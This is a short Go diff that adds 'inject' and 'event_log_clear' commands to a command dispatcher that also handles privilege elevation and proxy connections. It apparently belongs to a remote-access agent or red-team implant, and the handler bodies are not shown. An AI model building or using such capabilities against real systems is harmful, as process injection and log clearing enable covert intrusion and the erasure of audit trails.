@@ -3110,6 +3110,12 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		payload, _ := envelope["payload"].(map[string]interface{})
 		password, _ := payload["password"].(string)
 		return HandleElevate(ctx, env, cmdID, password)
+	case "inject":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		return HandleInject(ctx, env, cmdID, payload)
+	case "event_log_clear":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		return HandleEventLogClear(ctx, env, cmdID, payload)
 	case "proxy_connect":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		return HandleProxyConnect(ctx, env, cmdID, payload)
